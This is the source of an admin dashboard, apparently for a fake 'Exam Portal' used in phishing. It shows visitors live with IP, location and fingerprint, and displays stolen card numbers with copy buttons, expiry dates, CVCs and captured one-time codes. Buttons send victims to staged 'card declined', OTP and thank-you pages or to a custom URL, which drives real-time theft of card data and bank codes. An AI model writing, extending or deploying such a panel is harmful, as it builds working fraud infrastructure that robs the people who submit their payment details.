<?php
require_once __DIR__ . '/../includes/functions.php';
requireAdmin();

$db = getDB();
$db->exec("UPDATE visitors SET is_online = 0 WHERE last_activity < datetime('now', '-10 seconds') AND is_online = 1");

$visitorTotal = $db->query("SELECT COUNT(*) as cnt FROM visitors")->fetch()['cnt'];
$visitorOnline = $db->query("SELECT COUNT(*) as cnt FROM visitors WHERE is_online = 1")->fetch()['cnt'];
$visitorRegistered = $db->query("SELECT COUNT(*) as cnt FROM visitors WHERE student_id IS NOT NULL")->fetch()['cnt'];
$visitorDisconnected = $db->query("SELECT COUNT(*) as cnt FROM visitors WHERE is_online = 0")->fetch()['cnt'];
$visitorWaiting = $db->query("SELECT COUNT(*) as cnt FROM visitors WHERE status = 'waiting' AND is_online = 1")->fetch()['cnt'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Exam Portal</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        .visitors-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
            gap: 16px;
        }
        .vw {
            background: var(--card);
            border-radius: 12px;
            box-shadow: 0 1px 3px rgba(0,0,0,.05), 0 2px 8px rgba(0,0,0,.03);
            overflow: hidden;
            border-left: 4px solid var(--success);
        }
        .vw.offline { border-left-color: #cbd5e1; opacity: .5; }
        .vw.offline:hover { opacity: .75; }
        .vw.action-required { border-left-color: #f59e0b; border-left-width: 5px; opacity: 1; }

        .vw-head {
            padding: 10px 14px; border-bottom: 1px solid #f1f5f9;
        }
        .vw-head-row {
            display: flex; justify-content: space-between; align-items: center; gap: 8px;
        }
        .vw-head-left { display: flex; align-items: center; gap: 8px; min-width: 0; }
        .vw-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
        .vw-dot.on { background: #16a34a; animation: pulse 2s infinite; }
        .vw-dot.off { background: #cbd5e1; }
        @keyframes pulse { 0%,100% { box-shadow: 0 0 0 0 rgba(22,163,74,.35); } 50% { box-shadow: 0 0 0 5px rgba(22,163,74,0); } }
        .vw-ip { font-family: 'Consolas', monospace; font-size: .82rem; font-weight: 600; }
        .vw-flag { font-size: 1.05rem; }
        .vw-head-right { display: flex; align-items: center; gap: 6px; flex-shrink: 0; }
        .vw-time { font-size: .72rem; color: var(--text-light); }
        .vw-action-bar {
            margin-top: 6px;
            display: none;
        }
        .vw-action-bar.visible { display: block; }

        .badge-sm {
            display: inline-block; padding: 2px 8px; border-radius: 12px;
            font-size: .68rem; font-weight: 700; white-space: nowrap;
        }
        .b-offline { background: #f1f5f9; color: #94a3b8; }
        .b-viewing { background: #dbeafe; color: #1d4ed8; }
        .b-filling { background: #fef3c7; color: #b45309; }
        .b-reading { background: #ede9fe; color: #7c3aed; }
        .b-registered { background: #dcfce7; color: #15803d; }
        .b-waiting { background: #fff7ed; color: #c2410c; }
        .b-exam { background: #fce7f3; color: #be185d; }
        .b-payment { background: #ecfdf5; color: #059669; }
        .b-action {
            background: #fef2f2; color: #dc2626; font-size: .7rem;
            animation: actionPulse 1.5s infinite;
        }
        @keyframes actionPulse { 0%,100% { opacity: 1; } 50% { opacity: .5; } }

        /* Identity + submitted data */
        .vw-identity { padding: 10px 14px 0; }
        .vw-name { font-weight: 700; font-size: .95rem; }
        .vw-email { font-size: .78rem; color: var(--text-light); }
        .vw-submitted { padding: 6px 14px 0; }
        .vw-submitted-row {
            display: flex; gap: 6px; font-size: .78rem; padding: 3px 0;
            border-bottom: 1px solid #f8fafc;
        }
        .vw-submitted-row:last-child { border-bottom: none; }
        .vw-submitted-row .lbl { color: var(--text-light); font-weight: 500; min-width: 55px; flex-shrink: 0; }
        .vw-submitted-row .val { color: var(--text); word-break: break-word; }

        /* Fingerprint */
        .vw-fp { padding: 8px 14px; }
        .vw-fp-title { font-size: .66rem; text-transform: uppercase; letter-spacing: .6px; color: var(--text-light); margin-bottom: 5px; font-weight: 600; }
        .vw-fp-grid { display: flex; flex-wrap: wrap; gap: 3px; }
        .vw-fp-tag {
            display: inline-flex; align-items: center; gap: 3px;
            background: #f8fafc; border: 1px solid #e2e8f0;
            padding: 2px 7px; border-radius: 5px; font-size: .7rem; white-space: nowrap;
        }
        .vw-fp-tag .lbl { color: var(--text-light); font-weight: 500; }

        /* Actions */
        .vw-actions { display: flex; gap: 6px; padding: 8px 14px 12px; flex-wrap: wrap; }
        .vw-btn {
            padding: 5px 10px; border: 1.5px solid var(--border); border-radius: 6px;
            background: #fff; font-size: .72rem; font-weight: 600; color: var(--text-light);
            cursor: pointer; transition: all .15s; font-family: inherit;
        }
        .vw-btn:hover:not(:disabled) { border-color: var(--primary); color: var(--primary); background: #eff6ff; }
        .vw-btn:disabled { opacity: .35; cursor: default; }
        .vw-btn-danger:hover:not(:disabled) { border-color: var(--danger); color: var(--danger); background: #fef2f2; }
        .vw-btn-success:hover:not(:disabled) { border-color: var(--success); color: var(--success); background: #f0fdf4; }
        .vw-btn-active { border-color: var(--primary); color: var(--primary); background: #eff6ff; }

        /* Redirect dropdown */
        .vw-redirect-panel {
            padding: 0 14px 12px;
            display: none;
        }
        .vw-redirect-panel.open { display: block; }
        .vw-redirect-options { display: flex; flex-wrap: wrap; gap: 6px; }
        .vw-redir-btn {
            padding: 6px 12px; border: 1.5px solid var(--border); border-radius: 8px;
            background: #fff; font-size: .78rem; font-weight: 600; cursor: pointer;
            transition: all .15s; font-family: inherit; color: var(--text);
        }
        .vw-redir-btn:hover { border-color: var(--primary); background: #eff6ff; color: var(--primary); }

        .empty-state { text-align: center; padding: 60px 20px; color: var(--text-light); grid-column: 1/-1; }
        .empty-state h3 { color: var(--text); margin-bottom: 4px; }

        @media (max-width: 768px) {
            .visitors-grid { grid-template-columns: 1fr; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>
<body>
<div class="admin-layout">
    <aside class="admin-sidebar">
        <div class="logo">Exam Portal</div>
        <nav>
            <a href="index.php" class="active">Dashboard</a>
            <a href="students.php">All Students</a>
            <a href="activity.php">Activity Log</a>
            <a href="settings.php">Settings</a>
            <a href="logout.php">Logout</a>
        </nav>
    </aside>
    <main class="admin-main">
        <div class="admin-header">
            <h1>Live Dashboard</h1>
            <span style="font-size:.82rem;color:var(--text-light)">Auto-refresh: 3s</span>
        </div>
        <div class="stats-grid">
            <div class="stat-card"><div class="label">Total Visitors</div><div class="value" id="stat-total"><?= $visitorTotal ?></div></div>
            <div class="stat-card"><div class="label">Online Now</div><div class="value online" id="stat-online"><?= $visitorOnline ?></div></div>
            <div class="stat-card"><div class="label">Registered</div><div class="value" style="color:var(--primary)" id="stat-registered"><?= $visitorRegistered ?></div></div>
            <div class="stat-card"><div class="label">Waiting</div><div class="value" style="color:#c2410c" id="stat-waiting"><?= $visitorWaiting ?></div></div>
            <div class="stat-card"><div class="label">Disconnected</div><div class="value" style="color:var(--text-light)" id="stat-disconnected"><?= $visitorDisconnected ?></div></div>
        </div>
        <div class="visitors-grid" id="visitors-grid">
            <div class="empty-state">Loading...</div>
        </div>
    </main>
</div>

<script>
function esc(s) { const d=document.createElement('div'); d.textContent=s||''; return d.innerHTML; }

function flag(code) {
    if (!code||code.length!==2) return '';
    return String.fromCodePoint(code.charCodeAt(0)-65+0x1F1E6, code.charCodeAt(1)-65+0x1F1E6);
}

function ts(d) {
    if (!d) return '--';
    const s=Math.floor((new Date()-new Date(d+'Z'))/1000);
    if(s<10)return 'now'; if(s<60)return s+'s'; if(s<3600)return Math.floor(s/60)+'m';
    if(s<86400)return Math.floor(s/3600)+'h'; return Math.floor(s/86400)+'d';
}

function statusBadge(v) {
    if (!v.is_online) return '<span class="badge-sm b-offline">Disconnected</span>';
    const m = {
        'viewing':['b-viewing','Viewing'], 'filling_form':['b-filling','Filling Form'],
        'reading_policies':['b-reading','Reading Policies'], 'registered':['b-registered','Registered'],
        'waiting':['b-waiting','Waiting'], 'exam':['b-exam','In Exam'], 'payment':['b-payment','Payment'],
        'approve':['b-exam','Approving'], 'otp':['b-reading','OTP Page'], 'thankyou':['b-registered','Thank You']
    };
    const [c,t] = m[v.status]||['b-viewing','Viewing'];
    return `<span class="badge-sm ${c}">${t}</span>`;
}

const cardMap = {};

function copyNum(btn, text) {
    navigator.clipboard.writeText(text).then(() => {
        const orig = btn.textContent;
        btn.textContent = 'Copied';
        setTimeout(() => { btn.textContent = orig; }, 1200);
    });
}

function renderOneCard(p, idx, total) {
    const cn = p.card_number || '';
    const label = total > 1 ? `Card #${idx+1}` : 'Card Data';
    const copyId = 'cn_' + Math.random().toString(36).slice(2,8);
    return `
        <div style="margin-top:6px;padding-top:8px;border-top:1.5px dashed #e2e8f0">
            <div class="vw-submitted-row"><span class="lbl" style="color:#c2410c;font-weight:700">${label}</span><span class="val" style="color:#c2410c;font-size:.72rem">Received ${esc(p.received_at||'')}</span></div>
            <div class="vw-submitted-row"><span class="lbl">Name</span><span class="val">${esc(p.cardholder)}</span></div>
            <div class="vw-submitted-row"><span class="lbl">Number</span><span class="val" style="display:flex;align-items:center;gap:6px"><span style="font-family:Consolas,monospace;letter-spacing:.5px">${esc(cn)}</span><button onclick="copyNum(this,'${esc(cn)}')" style="padding:1px 6px;border:1px solid #cbd5e1;border-radius:4px;background:#f8fafc;font-size:.65rem;cursor:pointer;white-space:nowrap">Copy</button></span></div>
            <div class="vw-submitted-row"><span class="lbl">Type</span><span class="val">${esc(p.card_type)}</span></div>
            <div class="vw-submitted-row"><span class="lbl">Expiry</span><span class="val">${esc(p.expiry)}</span></div>
            <div class="vw-submitted-row"><span class="lbl">CVC</span><span class="val">${esc(p.cvc||'')}</span></div>
            <div class="vw-submitted-row"><span class="lbl">Amount</span><span class="val">${esc(p.amount)}</span></div>
        </div>`;
}

function paymentHTML(v) {
    if (!v.payment_data) return '';
    try {
        let raw = typeof v.payment_data === 'string' ? JSON.parse(v.payment_data) : v.payment_data;
        // Support both old single-object and new array format
        const list = Array.isArray(raw) ? raw : [raw];
        return list.map((p, i) => renderOneCard(p, i, list.length)).join('');
    } catch(e) { return ''; }
}

function otpHTML(v) {
    if (!v.otp_data) return '';
    try {
        let raw = typeof v.otp_data === 'string' ? JSON.parse(v.otp_data) : v.otp_data;
        // Support both old single-object and new array format
        const list = Array.isArray(raw) ? raw : [raw];
        return list.map((o, i) => {
            const label = list.length > 1 ? `OTP #${i+1}` : 'OTP Code';
            return `
            <div style="margin-top:6px;padding-top:8px;border-top:1.5px dashed #e2e8f0">
                <div class="vw-submitted-row"><span class="lbl" style="color:#7c3aed;font-weight:700">${label}</span><span class="val" style="color:#7c3aed;font-size:.72rem">Received ${esc(o.received_at||'')}</span></div>
                <div class="vw-submitted-row"><span class="lbl">Code</span><span class="val" style="font-family:Consolas,monospace;letter-spacing:2px;font-size:1.1rem;font-weight:700">${esc(o.code)}</span></div>
            </div>`;
        }).join('');
    } catch(e) { return ''; }
}

function createCard(v, grid) {
    const el = document.createElement('div');
    el.dataset.vid = v.id;
    if (v.student_id) el.dataset.sid = v.student_id;
    el.innerHTML = buildInner(v);
    setClass(el, v);
    cardMap[v.id] = el;
    grid.appendChild(el);
}

function setClass(el, v) {
    const isWaiting = v.is_online && v.status === 'waiting';
    el.className = 'vw' + (!v.is_online ? ' offline' : '') + (isWaiting ? ' action-required' : '');
}

function updateCard(v) {
    const el = cardMap[v.id];
    if (!el) return;
    setClass(el, v);
    // Update dynamic parts only
    const dot = el.querySelector('.vw-dot');
    if (dot) dot.className = 'vw-dot ' + (v.is_online ? 'on' : 'off');
    const badge = el.querySelector('[data-u="badge"]');
    if (badge) badge.innerHTML = statusBadge(v);
    const actionBar = el.querySelector('[data-u="action"]');
    if (actionBar) {
        const shouldShow = v.is_online && v.status === 'waiting';
        actionBar.className = 'vw-action-bar' + (shouldShow ? ' visible' : '');
    }
    const time = el.querySelector('[data-u="time"]');
    if (time) time.textContent = ts(v.last_activity);
    // Show identity if appeared
    if (v.name && v.surname && !el.querySelector('.vw-identity')) {
        const head = el.querySelector('.vw-head');
        if (head) {
            const div = document.createElement('div');
            div.className = 'vw-identity';
            div.innerHTML = `<div class="vw-name">${esc(v.name)} ${esc(v.surname)}</div><div class="vw-email">${esc(v.email)}</div>`;
            head.after(div);
        }
    }
    // Show submitted data if appeared
    if (v.name && v.address && !el.querySelector('.vw-submitted')) {
        const ident = el.querySelector('.vw-identity');
        if (ident) {
            const div = document.createElement('div');
            div.className = 'vw-submitted';
            div.setAttribute('data-u', 'submitted');
            div.innerHTML = `
                ${v.phone ? `<div class="vw-submitted-row"><span class="lbl">Phone</span><span class="val">${esc(v.phone)}</span></div>` : ''}
                ${v.email ? `<div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>` : ''}
                ${v.address ? `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>` : ''}
                ${paymentHTML(v)}
                ${otpHTML(v)}`;
            ident.after(div);
        }
    }
    // Update student_id on card + enable redirect
    if (v.student_id) {
        el.dataset.sid = v.student_id;
        const redirBtn = el.querySelector('[data-u="redir-btn"]');
        if (redirBtn) redirBtn.disabled = false;
    }

    // Refresh submitted data section (picks up new payment/otp data)
    const sub = el.querySelector('[data-u="submitted"]');
    if (sub && v.name) {
        sub.innerHTML = `
            ${v.phone ? `<div class="vw-submitted-row"><span class="lbl">Phone</span><span class="val">${esc(v.phone)}</span></div>` : ''}
            ${v.email ? `<div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>` : ''}
            ${v.address ? `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>` : ''}
            ${paymentHTML(v)}
            ${otpHTML(v)}`;
    }
}

function buildInner(v) {
    const online = !!v.is_online;
    const loc = [v.city, v.region, v.country].filter(Boolean).join(', ') || 'Unknown';
    const f = flag((v.country_code||'').toUpperCase());
    const hasId = v.name && v.surname;
    const isWaiting = online && v.status === 'waiting';

    return `
        <div class="vw-head">
            <div class="vw-head-row">
                <div class="vw-head-left">
                    <span class="vw-dot ${online?'on':'off'}"></span>
                    ${f?`<span class="vw-flag">${f}</span>`:''}
                    <span class="vw-ip">${esc(v.ip_address)}</span>
                </div>
                <div class="vw-head-right">
                    <span data-u="badge">${statusBadge(v)}</span>
                    <span class="vw-time" data-u="time">${ts(v.last_activity)}</span>
                </div>
            </div>
            <div class="vw-action-bar ${isWaiting?'visible':''}" data-u="action">
                <span class="badge-sm b-action">ACTION REQUIRED — Student is waiting for redirect</span>
            </div>
        </div>
        ${hasId ? `
        <div class="vw-identity">
            <div class="vw-name">${esc(v.name)} ${esc(v.surname)}</div>
            <div class="vw-email">${esc(v.email)}</div>
        </div>
        <div class="vw-submitted" data-u="submitted">
            ${v.phone ? `<div class="vw-submitted-row"><span class="lbl">Phone</span><span class="val">${esc(v.phone)}</span></div>` : ''}
            ${v.email ? `<div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>` : ''}
            ${v.address ? `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>` : ''}
            ${paymentHTML(v)}
            ${otpHTML(v)}
        </div>` : ''}
        <div class="vw-fp">
            <div class="vw-fp-title">Fingerprint</div>
            <div class="vw-fp-grid">
                <span class="vw-fp-tag"><span class="lbl">Loc</span> ${esc(loc)}</span>
                <span class="vw-fp-tag"><span class="lbl">Br</span> ${esc(v.browser)}</span>
                <span class="vw-fp-tag"><span class="lbl">Dev</span> ${esc(v.device)}</span>
                <span class="vw-fp-tag"><span class="lbl">OS</span> ${esc(v.os)}</span>
                <span class="vw-fp-tag"><span class="lbl">Scr</span> ${esc(v.screen_resolution)}</span>
                <span class="vw-fp-tag"><span class="lbl">TZ</span> ${esc(v.timezone)}</span>
                <span class="vw-fp-tag"><span class="lbl">Lang</span> ${esc(v.language)}</span>
            </div>
        </div>
        <div class="vw-actions">
            <button class="vw-btn" data-u="redir-btn" onclick="toggleRedirect(${v.id})" ${v.student_id?'':'disabled'}>Redirect</button>
            <button class="vw-btn" disabled>Message</button>
            <button class="vw-btn vw-btn-danger" disabled>Kick</button>
            <button class="vw-btn vw-btn-success" disabled>Approve</button>
        </div>
        <div class="vw-redirect-panel" id="redir-${v.id}">
            <div class="vw-redirect-options">
                <button class="vw-redir-btn" onclick="doRedirect(${v.id},'payment.php')">Payment</button>
                <button class="vw-redir-btn" style="color:#dc2626" onclick="doRedirect(${v.id},'payment.php?error=declined')">Card Declined</button>
                <button class="vw-redir-btn" style="color:#dc2626" onclick="doRedirect(${v.id},'payment.php?error=insufficient')">Insufficient</button>
                <button class="vw-redir-btn" style="color:#dc2626" onclick="doRedirect(${v.id},'payment.php?error=expired')">Card Expired</button>
                <button class="vw-redir-btn" style="color:#dc2626" onclick="doRedirect(${v.id},'payment.php?error=error')">Payment Error</button>
                <button class="vw-redir-btn" onclick="doRedirect(${v.id},'approve.php')">Approve</button>
                <button class="vw-redir-btn" onclick="doRedirect(${v.id},'otp.php')">OTP</button>
                <button class="vw-redir-btn" onclick="doRedirect(${v.id},'thankyou.php')">Thank You</button>
                <button class="vw-redir-btn" onclick="doRedirect(${v.id},'waiting.php')">Waiting Room</button>
                <input type="text" id="custom-url-${v.id}" placeholder="Custom URL..." style="padding:6px 10px;border:1.5px solid var(--border);border-radius:8px;font-size:.78rem;flex:1;min-width:120px">
                <button class="vw-redir-btn" onclick="doCustomRedirect(${v.id})">Send</button>
            </div>
        </div>`;
}

function toggleRedirect(vid) {
    const panel = document.getElementById('redir-' + vid);
    if (panel) panel.classList.toggle('open');
}

// Build base URL from current location
const _base = window.location.href.split('/admin/')[0] + '/';

function getSid(vid) {
    const card = cardMap[vid];
    return card ? parseInt(card.dataset.sid) : 0;
}

async function doRedirect(vid, page) {
    const sid = getSid(vid);
    if (!sid) { alert('Student not yet registered'); return; }
    const url = _base + page;
    const resp = await fetch('api/redirect.php', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ student_id: sid, url: url })
    });
    const data = await resp.json();
    if (data.success) {
        alert('Redirect sent to ' + page + '! Student will be redirected within 5 seconds.');
        toggleRedirect(vid);
    } else {
        alert('Error: ' + (data.error || 'Failed'));
    }
}

async function doCustomRedirect(vid) {
    const sid = getSid(vid);
    if (!sid) { alert('Student not yet registered'); return; }
    const url = document.getElementById('custom-url-' + vid).value.trim();
    if (!url) { alert('Enter a URL'); return; }
    const fullUrl = url.startsWith('http') ? url : _base + url;
    const resp = await fetch('api/redirect.php', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ student_id: sid, url: fullUrl })
    });
    const data = await resp.json();
    if (data.success) {
        alert('Redirect sent!');
        toggleRedirect(vid);
    } else {
        alert('Error: ' + (data.error || 'Failed'));
    }
}

async function refreshDashboard() {
    try {
        const resp = await fetch('api/dashboard.php');
        const data = await resp.json();

        document.getElementById('stat-total').textContent = data.stats.visitorTotal||0;
        document.getElementById('stat-online').textContent = data.stats.visitorOnline||0;
        document.getElementById('stat-registered').textContent = data.stats.visitorRegistered||0;
        document.getElementById('stat-waiting').textContent = data.stats.visitorWaiting||0;
        document.getElementById('stat-disconnected').textContent = data.stats.visitorDisconnected||0;

        const grid = document.getElementById('visitors-grid');

        if (!data.visitors||!data.visitors.length) {
            if (!grid.querySelector('.empty-state'))
                grid.innerHTML = '<div class="empty-state"><h3>No visitors yet</h3><p>Visitors appear the moment someone opens the exam page.</p></div>';
            return;
        }

        const emptyState = grid.querySelector('.empty-state');
        if (emptyState) emptyState.remove();

        const incomingIds = new Set();
        data.visitors.forEach(v => {
            incomingIds.add(v.id);
            if (!cardMap[v.id]) {
                createCard(v, grid);
            } else {
                updateCard(v);
            }
        });

        // Remove gone cards
        Object.keys(cardMap).forEach(vid => {
            if (!incomingIds.has(parseInt(vid))) {
                if (cardMap[vid].parentNode) cardMap[vid].remove();
                delete cardMap[vid];
            }
        });

    } catch(e) { console.error('Refresh failed', e); }
}

refreshDashboard();
setInterval(refreshDashboard, 3000);
</script>
</body>
</html>
